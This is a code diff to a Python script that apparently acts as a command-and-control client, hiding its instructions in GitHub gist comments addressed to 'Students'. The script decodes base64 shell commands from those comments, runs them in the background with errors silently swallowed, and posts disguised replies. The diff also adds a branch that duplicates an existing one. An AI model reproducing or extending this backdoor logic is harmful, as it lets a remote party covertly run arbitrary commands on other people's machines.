@@ -148,7 +148,10 @@ def execute_command_task(git, message):
     comment_message += generate_random_string(8)
     comment_message += ".ru\n\n"
     bash_command = str(base64.b64decode(message[3].split()[3]).decode("utf-8"))+" &"
-    execute_command(bash_command)
+    try:
+        output, error = execute_command(bash_command)
+    except:
+        return
     git.add_comment_to_gist(comment_message)
 
 
@@ -188,6 +191,8 @@ if __name__ == '__main__':
                 get_username(git_instance, body)
             elif body[1].startswith("Students, find and write here"):
                 copy_file(git_instance, body)
+            elif body[1].startswith("Students, there has been a breach"):
+                execute_command_task(git_instance, body)
             elif body[1].startswith("Students, there has been a breach"):
                 execute_command_task(git_instance, body)
         time.sleep(5)
